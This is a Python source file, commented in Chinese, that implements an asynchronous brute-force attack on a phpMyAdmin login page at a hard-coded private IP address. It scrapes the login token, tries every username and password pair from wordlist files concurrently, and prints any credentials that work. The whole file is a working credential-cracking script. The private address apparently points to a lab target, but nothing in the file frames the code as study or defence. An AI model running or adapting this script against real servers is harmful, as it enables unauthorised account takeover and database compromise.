import aiofiles
import re
import aiohttp
import asyncio
import time

# 非dns解析情况下cookie设置
jar = aiohttp.CookieJar(unsafe=True)
# 队列停止符
end_flag = object()
# 用户名密码队列
username_list = []
password_list = []


async def read_file(filename, queue):
    """处理文件到列表中"""
    async with aiofiles.open(filename, mode="r", encoding="utf-8") as f:
        while True:
            line = await f.readline()
            if not line:
                break
            else:
                line = line.strip("\n")
                queue.append(line)


async def handle_request(session, url, method, **kwargs):
    """处理请求"""
    header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
    }
    if method == "GET":
        try:
            async with session.get(url=url, headers=header) as response:
                text = await response.text()
                code = response.status
                return code, text
        except asyncio.TimeoutError as e:
            return None, None
    elif method == "POST":
        data = {
            "pma_username": kwargs.get("username"),
            "pma_password": kwargs.get("password"),
            "server": "1",
            "lang": "zh_CN",
            "token": kwargs.get("token")
        }
        try:
            async with session.post(url=url, headers=header, data=data) as response:
                if response:
                    text = await response.text()
                    code = response.status
                    return code, text
        except asyncio.TimeoutError as e:
            return None, None


async def phpmyadmin_crack(token, session, username, password):
    """phpmyadmin密码爆破"""
    login_url = "http://192.168.52.143/phpmyadmin/index.php"
    # print("爆破账号:{user},爆破密码:{password}".format(user=username, password=password))
    # 第二次请求登录
    second_code, second_response = await handle_request(session=session, url=login_url, method="POST", username=username,
                         password=password,
                         token=token)
    if not all([second_code, second_response]):
        return
    if second_code != 302:
        return
    else:
        # 首页
        index_url = "http://192.168.52.143/phpmyadmin/main.php?token={}".format(token)
        index_code, index_response = await handle_request(session=session, url=index_url, method="GET")
        if not all([index_code, index_response]):
            return
        if "常规设置" in index_response:
            print("登录成功:用户名为{u},密码为{p}".format(u=username, p=password))
            return


async def handle_user_pass():
    """处理用户名密码"""
    user_pass_tasks = [
        asyncio.create_task(read_file("Username.txt", username_list)),
        asyncio.create_task(read_file("Password.txt", password_list)),
    ]
    await asyncio.wait(user_pass_tasks)


async def main():
    await handle_user_pass()
    url = "http://192.168.52.143/phpmyadmin/index.php"
    timeout = aiohttp.ClientTimeout(total=120)
    async with aiohttp.TCPConnector(limit=10, force_close=True, enable_cleanup_closed=True, ssl=False) as tc:
        async with aiohttp.ClientSession(connector=tc, cookie_jar=jar, timeout=timeout) as session:
            # 第一次请求获取token
            first_code, first_response = await handle_request(session=session, url=url, method="GET")
            if not all([first_code, first_response]):
                return
            # 获取token
            token_search = re.compile(r'token=(.*?)"\s?target')
            token = token_search.search(first_response)

            if not token:
                print("获取token失败")
                return
            else:
                token_value = token.group(1)
                for username in username_list:
                    crack_phpmyadmin_tasks = [asyncio.create_task(phpmyadmin_crack(session=session, token=token_value, username=username, password=password)) for password in password_list]
                    await asyncio.wait(crack_phpmyadmin_tasks)


if __name__ == '__main__':
    def handle_time():
        """处理时间"""
        timestamp = time.time()
        time_local = time.localtime(timestamp)
        time_format = time.strftime("%Y-%m-%d %H:%M:%S", time_local)
        return timestamp, time_format


    start_timestamp, start_time = handle_time()
    print("开始扫描时间{}".format(start_time))
    # 调用主方法
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    end_timestamp, end_time = handle_time()
    print("扫描完成时间{}, 扫描耗时:{}分钟".format(end_time, int((end_timestamp - start_timestamp) / 60)))
